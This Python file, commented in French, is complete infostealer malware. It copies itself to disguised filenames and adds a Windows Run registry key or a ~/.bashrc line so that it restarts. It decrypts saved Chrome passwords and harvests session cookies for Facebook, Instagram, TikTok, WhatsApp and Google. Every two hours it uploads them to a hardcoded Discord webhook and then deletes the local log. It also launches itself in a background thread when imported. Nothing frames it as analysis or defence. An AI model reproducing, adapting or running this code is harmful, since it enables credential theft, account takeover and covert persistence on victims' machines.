import os
import platform
import threading
import requests
import browser_cookie3
import shutil
import sys
import time
from datetime import datetime

# ================== CONFIGURATION DISCORD ==================
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1555687555171622953/oM4CcRxiVBDZOAGm8564XM4YA0F2u85pEFISHW0RSzqztPCBJLMI48CXo6Ku3vklkZgH"
# ===========================================================

TARGET_SITES = ["facebook.com", "instagram.com", "tiktok.com", "whatsapp.com", "google.com"]

def etablir_persistance():
    """Se copie dans le système et s'ajoute au démarrage"""
    os_type = platform.system()
    try:
        if os_type == "Windows":
            dest = os.path.join(os.environ["APPDATA"], "SystemHealth.py")
            if not os.path.exists(dest):
                shutil.copyfile(os.path.abspath(sys.argv[0]), dest)
                import winreg
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "SystemUpdater", 0, winreg.REG_SZ, f'pythonw "{dest}"')
                winreg.CloseKey(key)
        elif os_type == "Linux":
            dest = os.path.expanduser("~/.local/bin/system_service.py")
            os.makedirs(os.path.dirname(dest), exist_ok=True)
            shutil.copyfile(os.path.abspath(sys.argv[0]), dest)
            bashrc = os.path.expanduser("~/.bashrc")
            with open(bashrc, "a") as f:
                f.write(f'\npython3 {dest} & > /dev/null 2>&1\n')
    except: pass

def get_passwords():
    """Déchiffre les mots de passe Chrome (Windows uniquement)"""
    pass_data = "--- MOTS DE PASSE ENREGISTRÉS ---\n"
    if platform.system() == "Windows":
        try:
            import sqlite3
            import win32crypt
            path = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\Login Data")
            if os.path.exists(path):
                conn = sqlite3.connect(path)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for row in cursor.fetchall():
                    if any(s in row[0] for s in TARGET_SITES):
                        try:
                            pwd = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1].decode()
                            pass_data += f"Site: {row[0]} | User: {row[1]} | Pass: {pwd}\n"
                        except: pass
                conn.close()
        except: pass
    return pass_data

def collecter_et_envoyer():
    """Extrait tout et envoie un fichier sur Discord"""
    try:
        # 1. Extraction des cookies
        cookies = browser_cookie3.chrome()
        log_content = f"RAPPORT DU {datetime.now()} - USER: {os.getlogin()}\n\n"
        log_content += "--- COOKIES NETSCAPE ---\n"
        for c in cookies:
            if any(s in c.domain for s in TARGET_SITES):
                exp = int(c.expires) if c.expires else 0
                log_content += f"{c.domain}\tTRUE\t{c.path}\t{str(c.secure).upper()}\t{exp}\t{c.name}\t{c.value}\n"
        
        # 2. Ajout des mots de passe
        log_content += "\n" + get_passwords()

        # 3. Sauvegarde temporaire et envoi Discord
        file_name = f"logs_{os.getlogin()}.txt"
        with open(file_name, "w", encoding="utf-8") as f:
            f.write(log_content)
        
        with open(file_name, "rb") as f:
            requests.post(DISCORD_WEBHOOK_URL, files={"file": f}, data={"content": f"✅ Nouveau rapport reçu de **{os.getlogin()}** ({platform.system()})"})
        
        os.remove(file_name) # Nettoyage des traces
    except: pass

def routine_malware():
    etablir_persistance()
    while True:
        collecter_et_envoyer()
        time.sleep(7200) # Envoi toutes les 2 heures

# Déclenchement automatique
if __name__ != "__main__":
    threading.Thread(target=routine_malware, daemon=True).start()